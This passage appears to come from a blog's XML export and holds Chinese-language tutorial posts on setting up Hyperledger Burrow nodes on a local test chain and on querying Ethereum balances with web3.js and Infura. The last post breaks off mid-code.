        <tag>web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Hyperledger-Burrow-1</title>
    <url>/2020/05/11/%E4%BD%93%E9%AA%8CHyperledger-Burrow-1/</url>
    <content><![CDATA[<p>文档链接=&gt;<a href="https://hyperledger.github.io/burrow/">https://hyperledger.github.io/burrow/</a></p>
<p>github链接=&gt;<a href="https://github.com/hyperledger/burrow/">https://github.com/hyperledger/burrow/</a></p>
<p>Burrow是一个权限控制较为严格、以太坊EVM和WASM虚拟机支持、运行于Tendermint共识之上的区块链客户端。其主要由Monax贡献，并由Monax 和<a href="https://baike.baidu.com/item/%E8%8B%B1%E7%89%B9%E5%B0%94">英特尔</a>赞助。</p>
<p>其强调的设计理念包括：</p>
<ol>
<li>防篡改的Merkle状态—Tamper-resistant merkle state</li>
<li>PoS支持</li>
<li>链上治理原生支持</li>
<li>以太坊账户一览</li>
<li>可以根据每个帐户设置代码执行权限</li>
<li>事件流支持</li>
<li>智能合约事件弹出至SQL表记录</li>
<li>GRPC和Protobuf支持</li>
<li>Javascript SDK支持，客户端库可以生成代码来访问合约，生成的代码是静态的Typescript对象</li>
<li>Keys服务，提供代理签名服务器</li>
<li>Web3 RPC，兼容Ethereum主网的开发工具，如 Truffle、 Metamask、Remix</li>
</ol>
<p><strong>Burrow应用于多个区块链生产项目</strong>。</p>
<h3 id="初始化Burrow节点"><a href="#初始化Burrow节点" class="headerlink" title="初始化Burrow节点"></a>初始化Burrow节点</h3><p>从<a href="https://github.com/hyperledger/burrow/%E4%B8%8B%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%AC%E6%96%87%E4%BB%A5">https://github.com/hyperledger/burrow/下载可执行文件，本文以</a> ubuntu 环境为例。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./burrow spec -f2 -p2 | ./burrow configure --curve-type secp256k1 -s- --pool --separate-genesis-doc=genesis.json</span><br></pre></td></tr></table></figure>

<p><code>./burrow spec</code> 建立一个GenesisSpec作为GenesisDoc和configure命令的模板，f2是指2个full-accounts，p2是指2个participant-accounts。</p>
<p><code>--curve-type secp256k1</code> 是指定加密曲线的类型。</p>
<p><code>./burrow configure -s-</code> 通过使用GenesisDoc或GenesisSpec，创建密钥并创建配置文档。<code>--pool </code> 为名为burrowNNN.toml的所有共识节点（validators）编写配置文件。<code>--separate-genesis-doc</code> 将genesis文档投送至 JSON或者TOML文件。</p>
<ul>
<li><p>validator-accounts 共识的参与者，需要抵押一部分资金</p>
</li>
<li><p>root-accounts 根账户</p>
</li>
<li><p>developer-accounts 开发者，功能很多和全节点很像</p>
</li>
<li><p>participant-accounts 参与者</p>
</li>
<li><p>full-accounts 全功能</p>
</li>
</ul>
<h3 id="启动Burrow节点"><a href="#启动Burrow节点" class="headerlink" title="启动Burrow节点"></a>启动Burrow节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  script ./burrow start --config=burrow000.toml &amp;</span><br><span class="line">./burrow start --config=burrow001.toml &amp;</span><br><span class="line">./burrow start --config=burrow002.toml &amp;</span><br><span class="line">./burrow start --config=burrow003.toml &amp;</span><br><span class="line">[5] 12458</span><br><span class="line">[6] 12459</span><br><span class="line">[7] 12460</span><br><span class="line">[8] 12464</span><br></pre></td></tr></table></figure>

<h3 id="网页端访问RPC服务"><a href="#网页端访问RPC服务" class="headerlink" title="网页端访问RPC服务"></a>网页端访问RPC服务</h3><p><a href="http://127.0.0.1:26759/">http://127.0.0.1:26759/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Available endpoints:</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;account_stats</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;accounts</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;chain_id</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;consensus</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;genesis</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;network</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;network&#x2F;registry</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;validators</span><br><span class="line"></span><br><span class="line">Endpoints that require arguments:</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;account?address&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;account_human?address&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;block?height&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;blocks?minHeight&#x3D;_&amp;maxHeight&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;dump_storage?address&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;name?name&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;names?regex&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;status?block_time_within&#x3D;_&amp;block_seen_time_within&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;storage?address&#x3D;_&amp;key&#x3D;_</span><br><span class="line">&#x2F;&#x2F;127.0.0.1:26759&#x2F;unconfirmed_txs?maxTxs&#x3D;_</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Burrow</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊编程 使用web3和infura</title>
    <url>/2018/03/14/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-%E4%BD%BF%E7%94%A8web3%E5%92%8Cinfura/</url>
    <content><![CDATA[<h6 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h6><p>Github： <a href="https://github.com/ethereum/web3.js/">https://github.com/ethereum/web3.js/</a><br>web3.js是以太坊提供的一个Javascript库，它封装了以太坊的RPC通信API，提供了一系列与区块链交互方法，使js与以太坊交互变得简单。</p>
<h6 id="infura"><a href="#infura" class="headerlink" title="infura"></a>infura</h6><p>官网： <a href="https://infura.io/">https://infura.io/</a><br>本地安装geth的方法需要花比较多的时间和空间来同步区块，利用infura可以简单很多，infura提供公开以太坊和测试节点，可以利用infura提供的api访问以太坊以及IPFS。去官网只需要提供email注册得到链接即可。</p>
<p><img src="/2018/03/14/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-%E4%BD%BF%E7%94%A8web3%E5%92%8Cinfura/1.png"></p>
<p>使用web3和infura开发</p>
<p>最常用的操作例如查看一个以太坊地址的ether余额为例（类似etherscan）.</p>
<p>通过npm或其他方式引入web3, 并使用infura提供主网/测试网进行初始化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xxxx为你在infura申请的地址</span></span><br><span class="line">web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">&quot;https://mainnet.infura.io/xxxxxxxx&quot;</span>));</span><br><span class="line"><span class="comment">// 接下来就可以调用web3的接口了,例如获取一个地址的ether数量</span></span><br><span class="line"><span class="comment">// wei是以太坊上的的最小单位，ether小数点后18位为一个wei</span></span><br><span class="line"><span class="keyword">var</span> balanceWei = web3.eth.getBalance(<span class="string">&quot;0xC257274276a4E539741Ca11b590B9447B26A8051&quot;</span>).toNumber();</span><br><span class="line"><span class="comment">// 从wei转换成ether</span></span><br><span class="line"><span class="keyword">var</span> balance = web3.fromWei(balanceWei, <span class="string">&#x27;ether&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>至此便可以从以太坊主网上进行操作了，例如查看区块信息，部署智能合约等。<br>具体开发可以参考以太坊JS API： <a href="https://github.com/ethereum/wiki/wiki/JavaScript-API">https://github.com/ethereum/wiki/wiki/JavaScript-API</a> </p>
<p>相关内容：</p>
<ol>
<li><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-III/">以太坊编程 III</a></li>
<li><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/">以太坊编程 II</a></li>
<li><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/">以太坊编程 I</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Hyperledger-Burrow-3</title>
    <url>/2020/05/18/%E4%BD%93%E9%AA%8CHyperledger-Burrow-3/</url>
    <content><![CDATA[<h3 id="burrow-natives-Dump-Solidity-interface-contracts-for-Burrow-native-contracts"><a href="#burrow-natives-Dump-Solidity-interface-contracts-for-Burrow-native-contracts" class="headerlink" title="./burrow natives , Dump Solidity interface contracts for Burrow native contracts."></a>./burrow natives , Dump Solidity interface contracts for Burrow native contracts.</h3><p>抽出Burrow内置的solidity接口合约。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">➜  script ./burrow natives       </span><br><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* acmstate.ReaderWriter for managing Secure Native authorizations.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@dev </span>This interface describes the functions exposed by the native permissions layer in burrow.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@dev </span>These functions can be accessed as if this contract were deployed at a special address (0x0A758FEB535243577C1A79AE55BED8CA03E226EC).</span></span><br><span class="line"><span class="comment">* <span class="doctag">@dev </span>This special address is defined as the last 20 bytes of the sha3 hash of the the contract name.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@dev </span>To instantiate the contract use:</span></span><br><span class="line"><span class="comment">* <span class="doctag">@dev </span>Permissions permissions = Permissions(address(uint256(keccak256(&quot;Permissions&quot;))));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">interface Permissions &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Adds a role to an account</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Role role name</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>result whether role was added</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addRole</span>(<span class="params">address _account, string memory _role</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Removes a role from an account</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Role role name</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>result whether role was removed</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeRole</span>(<span class="params">address _account, string memory _role</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Indicates whether an account has a role</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Role role name</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>result whether account has role</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hasRole</span>(<span class="params">address _account, string memory _role</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Sets the permission flags for an account. Makes them explicitly set (on or off).</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Permission the base permissions flags to set for the account</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Set whether to set or unset the permissions flags at the account level</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>The permission flag that was set as uint64</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setBase</span>(<span class="params">address _account, uint64 _permission, bool _set</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint64 _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Unsets the permissions flags for an account. Causes permissions being unset to fall through to global permissions.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Permission the permissions flags to unset for the account</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>The permission flag that was unset as uint64</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unsetBase</span>(<span class="params">address _account, uint64 _permission</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint64 _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Indicates whether an account has a subset of permissions set</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Account account address</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Permission the permissions flags (mask) to check whether enabled against base permissions for the account</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>result whether account has the passed permissions flags set</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hasBase</span>(<span class="params">address _account, uint64 _permission</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool _result</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@notice </span>Sets the global (default) permissions flags for the entire chain</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Permission the permissions flags to set</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>Set whether to set (or unset) the permissions flags</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return </span>The permission flag that was set as uint64</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setGlobal</span>(<span class="params">uint64 _permission, bool _set</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint64 _result</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="burrow-dump-Dump-chain-state-to-backup"><a href="#burrow-dump-Dump-chain-state-to-backup" class="headerlink" title="./burrow dump , Dump chain state to backup"></a>./burrow dump , Dump chain state to backup</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">➜  script ./burrow dump local backup_dump</span><br><span class="line">Sourcing config <span class="keyword">from</span> first <span class="keyword">of</span>: defaults</span><br><span class="line">Sourcing config <span class="keyword">from</span> defaults</span><br><span class="line">Sourcing config <span class="keyword">from</span> first <span class="keyword">of</span>: genesis file at genesis.json</span><br><span class="line">Sourcing config <span class="keyword">from</span> genesis file at genesis.json</span><br><span class="line">&#123;<span class="string">&quot;log_channel&quot;</span>:<span class="string">&quot;Info&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Dumping accounts&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;log_channel&quot;</span>:<span class="string">&quot;Info&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Dumping names&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;log_channel&quot;</span>:<span class="string">&quot;Info&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Dumping events&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="burrow-restore-Restore-new-chain-from-backup"><a href="#burrow-restore-Restore-new-chain-from-backup" class="headerlink" title="./burrow restore, Restore new chain from backup"></a>./burrow restore, Restore new chain from backup</h3><p>从backup文件恢复区块链</p>
]]></content>
      <tags>
        <tag>Burrow</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Hyperledger-Burrow-2</title>
    <url>/2020/05/12/%E4%BD%93%E9%AA%8CHyperledger-Burrow-2/</url>
    <content><![CDATA[<p>文档链接=&gt;<a href="https://hyperledger.github.io/burrow/">https://hyperledger.github.io/burrow/</a></p>
<p>github链接=&gt;<a href="https://github.com/hyperledger/burrow/">https://github.com/hyperledger/burrow/</a></p>
<p>接前文《体验Hyperledger-Burrow-1》，启动4个节点如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  script ps aux | grep burrow</span><br><span class="line">USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">will      21409  2.1  0.8 133268 66036 pts/1    SNl  08:52   1:02 ./burrow start --config=burrow000.toml</span><br><span class="line">will      21410  1.9  0.7 133268 59212 pts/1    SNl  08:52   0:56 ./burrow start --config=burrow001.toml</span><br><span class="line">will      21411  2.0  0.8 133268 65924 pts/1    SNl  08:52   0:59 ./burrow start --config=burrow002.toml</span><br><span class="line">will      21416  2.0  0.7 133268 63416 pts/1    SNl  08:52   1:01 ./burrow start --config=burrow003.toml</span><br></pre></td></tr></table></figure>

<h3 id="制作增加节点的配置文件"><a href="#制作增加节点的配置文件" class="headerlink" title="制作增加节点的配置文件"></a>制作增加节点的配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./burrow spec -v1 | ./burrow configure -s- &gt; burrow_add.toml</span><br></pre></td></tr></table></figure>

<p>运行完成后，增加公私钥文档如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  data pwd</span><br><span class="line">/home/will/documents/burrow/script/.keys/data</span><br><span class="line">➜  data cat 035B1B192A16FF8086C36304024010502CEB2DE0.json </span><br><span class="line">&#123;&quot;CurveType&quot;:&quot;ed25519&quot;,&quot;Address&quot;:&quot;5ECA9967F5D363F21C4606CC971710200A64C5BC&quot;,&quot;PublicKey&quot;:&quot;4F3530024CF75A7AFC4D168CF2975C285D03CEBB1CBE82E21AD9C76531A63128&quot;,&quot;AddressHash&quot;:&quot;go-crypto-0.5.0&quot;,&quot;PrivateKey&quot;:&#123;&quot;Crypto&quot;:&quot;none&quot;,&quot;Plain&quot;:&quot;486059FB274248423F92B7522D5A237AB99B38C80F84D46F720EAE1506D8E2DF4F3530024CF75A7AFC4D168CF2975C285D03CEBB1CBE82E21AD9C76531A63128&quot;&#125;&#125;</span><br><span class="line">➜  names pwd</span><br><span class="line">/home/will/documents/burrow/script/.keys/names</span><br><span class="line">➜  names cat Validator_0</span><br><span class="line">035B1B192A16FF8086C36304024010502CEB2DE0</span><br></pre></td></tr></table></figure>

<p>修改burrow_add.toml配置:<br>1.删除GenesisDoc的内容，因为genesis.json中已经包含了节点们的GenesisDoc；<br>2.增加PersistentPeers，PersistentPeers在burrow000.toml中可以找到；<br>3关闭grpc端口，关闭rpc.info等，否则会跟已有的4个节点端口冲突</p>
<h3 id="发出增加validator的Tx"><a href="#发出增加validator的Tx" class="headerlink" title="发出增加validator的Tx"></a>发出增加validator的Tx</h3><p>制作增加validator Tx 交易的文件：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddValidator</span></span><br><span class="line">  <span class="attr">update-account:</span></span><br><span class="line">    <span class="attr">target:</span> <span class="string">4F3530024CF75A7AFC4D168CF2975C285D03CEBB1CBE82E21AD9C76531A63128</span></span><br><span class="line">    <span class="attr">power:</span> <span class="number">222222</span></span><br><span class="line">    <span class="attr">permissions:</span> [<span class="string">root</span>, <span class="string">send</span>, <span class="string">call</span>, <span class="string">createContract</span>, <span class="string">createAccount</span>, <span class="string">bond</span>, <span class="string">name</span>, <span class="string">proposal</span>, <span class="string">input</span>, <span class="string">batch</span>, <span class="string">identify</span>, <span class="string">hasBase</span>, <span class="string">setBase</span>, <span class="string">unsetBase</span>, <span class="string">setGlobal</span>, <span class="string">hasRole</span>, <span class="string">addRole</span>, <span class="string">removeRole</span>]</span><br></pre></td></tr></table></figure>

<p>其中<code>4F3530024CF75A7AFC4D168CF2975C285D03CEBB1CBE82E21AD9C76531A63128</code> 是新节点的publickey。</p>
<p>执行交易命令（<code>DCF0F3BD45EA59B2D471729EC22838DF7B119012</code> 是增加节点前已经启动的4个节点中的Full Account节点。），即在已经启动的节点上执行本交易：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./burrow deploy -c 127.0.0.1:10997 --mempool-signing=true --address=DCF0F3BD45EA59B2D471729EC22838DF7B119012 deploy.yaml</span><br><span class="line">log_channel=Info message=&quot;Using chain&quot; Chain=127.0.0.1:10997 Signer=</span><br><span class="line">log_channel=Info message=&quot;Loading Playbook File.&quot;</span><br><span class="line">log_channel=Info message=&quot;Loading playbook file&quot; path=/home/will/documents/burrow/script filename=/home/will/documents/burrow/script/deploy.yaml</span><br><span class="line">log_channel=Info message=&quot;*****Executing Job*****&quot; JobName=defaultAddr Type=Account</span><br><span class="line">log_channel=Info message=&quot;Setting Account&quot; account=DCF0F3BD45EA59B2D471729EC22838DF7B119012</span><br><span class="line">log_channel=Info message=&quot;*****Executing Job*****&quot; JobName=AddValidator Type=UpdateAccount</span><br><span class="line">log_channel=Info message=GovTx account=&quot;unsupported value type&quot;</span><br><span class="line">log_channel=Info message=&quot;Using mempool signing since no keyClient set, pass --keys to sign locally or elsewhere&quot;</span><br><span class="line">log_channel=Info message=&quot;Using mempool signing&quot;</span><br><span class="line">log_channel=Info message=&quot;Tx Return&quot; TransactionHash=5a1a57e975e5ead5079c12c63c473e1c04c59cf82fe9974f191faaf1d8aeb8b8 BlockHeight=18</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=input value=DCF0F3BD45EA59B2D471729EC22838DF7B119012</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=native value=</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=power value=222222</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=sequence value=</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=address value=</span><br><span class="line">log_channel=Info message=&quot;Job Vars&quot; name=publicKey value=D90E05FAD677699B4FEE56B567F85D3A90438B4B627C27CED0D4C850BDC97876</span><br><span class="line">log_channel=Info message=&quot;Writing to current directory&quot; output=/home/will/documents/burrow/script/deploy.output.json</span><br><span class="line">log_channel=Info message=&quot;JOBS THAT SUCCEEEDED&quot; count=1</span><br><span class="line">log_channel=Info message=&quot;Playbook result&quot; jobNo=0 file=deploy.yaml time=230.744184ms</span><br></pre></td></tr></table></figure>

<p>注意：新创建的validator没有余额。</p>
<h3 id="启动新增加的节点"><a href="#启动新增加的节点" class="headerlink" title="启动新增加的节点"></a>启动新增加的节点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./burrow start --config=burrow_add.toml --genesis=genesis.json --address=5ECA9967F5D363F21C4606CC971710200A64C5BC</span><br></pre></td></tr></table></figure>

<p><code>5ECA9967F5D363F21C4606CC971710200A64C5BC</code> 是被增加节点的地址(address)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  script ps aux | grep burrow</span><br><span class="line">USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">will      21409  2.1  0.8 133268 66036 pts/1    SNl  08:52   1:02 ./burrow start --config=burrow000.toml</span><br><span class="line">will      21410  1.9  0.7 133268 59212 pts/1    SNl  08:52   0:56 ./burrow start --config=burrow001.toml</span><br><span class="line">will      21411  2.0  0.8 133268 65924 pts/1    SNl  08:52   0:59 ./burrow start --config=burrow002.toml</span><br><span class="line">will      21416  2.0  0.7 133268 63416 pts/1    SNl  08:52   1:01 ./burrow start --config=burrow003.toml</span><br><span class="line">will      21505  2.2  0.7 133268 58864 pts/1    Sl+  08:55   1:01 ./burrow start --config=burrow_add.toml --genesis=genesis.json --address=DCF0F3BD45EA59B2D471729EC22838DF7B119012</span><br></pre></td></tr></table></figure>

<p>ed25519是tendermint选择的加密曲线，secp256k1是ethereum选择的加密曲线。</p>
<p>两者都可以在<code>./burrow keys list</code> 中看到账户地址和名称。在web3.getAccounts中只能够看到secp256k1曲线下生成的账户地址，metamask和remix也是如此。</p>
<p><code> burrow keys gen -n -t secp256k1 --name zhuang</code> 如果不指定 <code>-n</code> 的话，需要输入密码。 </p>
<h3 id="发送转账交易"><a href="#发送转账交易" class="headerlink" title="发送转账交易"></a>发送转账交易</h3><p>创建转账交易 deploy_sendToken.yaml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sendTxTest1</span></span><br><span class="line">  <span class="attr">send:</span></span><br><span class="line">      <span class="attr">destination:</span> <span class="string">0DE8C14FE07FA693D3A6F65D826647D39E9A3BB0</span></span><br><span class="line">      <span class="attr">amount:</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure>

<p>发起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  script ./burrow keys gen -n -t secp256k1 --name zhuang1</span><br><span class="line">0DE8C14FE07FA693D3A6F65D826647D39E9A3BB0</span><br><span class="line">➜  script ./burrow deploy --address CCC93802D38A33B636D8B2B74218021A571CF252 deploy_sendToken.yaml</span><br><span class="line">log_channel=Info message=&quot;Using chain&quot; Chain=127.0.0.1:10997 Signer=</span><br><span class="line">log_channel=Info message=&quot;Loading Playbook File.&quot;</span><br><span class="line">log_channel=Info message=&quot;Loading playbook file&quot; path=/home/will/documents/burrow/script filename=/home/will/documents/burrow/script/deploy_sendToken.yaml</span><br><span class="line">log_channel=Info message=&quot;*****Executing Job*****&quot; JobName=defaultAddr Type=Account</span><br><span class="line">log_channel=Info message=&quot;Setting Account&quot; account=CCC93802D38A33B636D8B2B74218021A571CF252</span><br><span class="line">log_channel=Info message=&quot;*****Executing Job*****&quot; JobName=sendTxTest1 Type=Send</span><br><span class="line">log_channel=Info message=&quot;Sending Transaction&quot; source=CCC93802D38A33B636D8B2B74218021A571CF252 destination=0DE8C14FE07FA693D3A6F65D826647D39E9A3BB0 amount=2000</span><br><span class="line">log_channel=Info message=SendTx send=&quot;unsupported value type&quot;</span><br><span class="line">log_channel=Info message=&quot;Using mempool signing since no keyClient set, pass --keys to sign locally or elsewhere&quot;</span><br><span class="line">log_channel=Info message=&quot;Using mempool signing&quot;</span><br><span class="line">log_channel=Info message=&quot;Tx Return&quot; TransactionHash=a0abda87ea4751beaeae04d5ac67c35114b9f068720db6e1795ec7083c4a872e BlockHeight=27</span><br><span class="line">log_channel=Info message=&quot;Writing to current directory&quot; output=/home/will/documents/burrow/script/deploy_sendToken.output.json</span><br><span class="line">log_channel=Info message=&quot;JOBS THAT SUCCEEEDED&quot; count=1</span><br><span class="line">log_channel=Info message=&quot;Playbook result&quot; jobNo=0 file=deploy_sendToken.yaml time=347.234362ms</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Burrow</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Hyperledger-Burrow-4</title>
    <url>/2020/05/18/%E4%BD%93%E9%AA%8CHyperledger-Burrow-4/</url>
    <content><![CDATA[<h3 id="CheckTx"><a href="#CheckTx" class="headerlink" title="CheckTx"></a>CheckTx</h3><p>在burrow项目中，<code>/consensus/abci/app.go</code>:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(app *App)</span> <span class="title">CheckTx</span><span class="params">(req types.RequestCheckTx)</span> <span class="title">types</span>.<span class="title">ResponseCheckTx</span></span> &#123;</span><br><span class="line">	......</span><br><span class="line">	checkTx := ExecuteTx(logHeader, app.checker, app.txDecoder, req.GetTx())</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处的 <code>ExecuteTx</code> 位于 <code>/execution/execution.go</code> :</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// If the tx is invalid, an error will be returned.</span></span><br><span class="line"><span class="comment">// Unlike ExecBlock(), state will not be altered.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(exe *executor)</span> <span class="title">Execute</span><span class="params">(txEnv *txs.Envelope)</span> <span class="params">(txe *exec.TxExecution, err error)</span></span> &#123;</span><br><span class="line">	......</span><br><span class="line">	<span class="comment">// Verify transaction signature against inputs</span></span><br><span class="line">	err = txEnv.Verify(exe.params.ChainID)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		logger.InfoMsg(<span class="string">&quot;Transaction Verify failed&quot;</span>, structure.ErrorKey, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> txExecutor, ok := 